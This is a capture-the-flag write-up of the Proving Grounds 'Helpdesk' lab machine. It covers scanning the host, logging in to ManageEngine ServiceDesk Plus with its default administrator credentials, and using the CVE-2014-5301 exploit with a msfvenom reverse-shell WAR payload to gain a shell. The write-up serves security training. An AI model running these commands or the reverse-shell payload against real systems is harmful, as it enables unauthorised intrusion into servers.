### Helpdesk Proving Grounds Practice

### Difficulty =  Easy

### IP Address = 192.168.95.43

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Helpdesk]
└─$ nmap -sCV -A 192.168.95.43 -p139,445,3389,8080 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 14:48 WAT
Nmap scan report for 192.168.95.43
Host is up (0.21s latency).

PORT     STATE SERVICE       VERSION
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-title: ManageEngine ServiceDesk Plus
|_http-server-header: Apache-Coyote/1.1
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-security-mode: 
|   2.0.2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-25T05:48:48-08:00
| smb2-time: 
|   date: 2023-01-25T13:48:48
|_  start_date: 2023-01-25T13:45:34
|_nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:bf:1b:23 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.04 seconds

```

Now lets enumerate smb

```
                                                                                                                                                                                                                  
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Helpdesk]
└─$ smbclient -L 192.168.95.43
Password for [WORKGROUP\mark]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.95.43 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We can't list shares anonymously 

So lets move on to the web server on port 8080

On navigating there shows a framework called `ManageEngine ServiceDesk Plus`

And it also shows a login page 
![image](https://user-images.githubusercontent.com/113513376/214581018-725a3143-86b5-4558-8f03-e2f8d067375a.png)

Below the web page shows the version of the framwork which is `ManageEngine ServiceDesk Plus 7.6.0`

Now i'll search for default credential if i can login with it

After searching it leads here [Credential](https://help.servicedeskplus.com/introduction/start-servicedeskplus-server.html)

The default credential is `administrator:administrator`

Now lets try login in with it 

Ah sweet it works
![image](https://user-images.githubusercontent.com/113513376/214582832-691ab26b-a7ef-44d5-89b5-507d2bc7f387.png)

So now i'll search for a way to get remote code execution

Ok i found one that looks cool to try [Exploit](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py)

Lets see what it requires

```
# Script usage: ./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE
1. HOST: target host
2. PORT: target port
3. USERNAME: a valid username for ManageEngine ServiceDesk Plus
4. PASSWORD: the password for the user
5. WARFILE: a war file containing the mallicious payload
```

Ok now i'll generate the war payload to be used using msfvenom

```
msf6 > msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.7 LPORT=1337 -f war -o shell.war
[*] exec: msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.7 LPORT=1337 -f war -o shell.war

Payload size: 13316 bytes
Final size of war file: 13316 bytes
Saved as: shell.war
msf6 >
```

Now i'll set up netcat to catch the reverse shell

Ok now lets run the exploit code

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Helpdesk]
└─$ python3 exploit.py 192.168.95.43 8080 administrator administrator shell.war 
Trying http://192.168.95.43:8080/VwanfQb2A2o4h7YlCTvOx7esmsYFS4hg/lhivbcumw/qdn4tdFwyzSMzDcn
Trying http://192.168.95.43:8080/VwanfQb2A2o4h7YlCTvOx7esmsYFS4hg/lhivbcumw/9oxpnx9huReQkUY8
```

And back on the listner we get a shell 

![image](https://user-images.githubusercontent.com/87468669/209433565-30966d1d-a150-4859-872b-4f06aee74908.png)
![image](https://user-images.githubusercontent.com/87468669/209433654-5c03ac27-0a2c-4ba6-a05c-de2ecd21f8c4.png)


And we're done 

<br> <br>
[Back To Home](../../index.md)
<br>

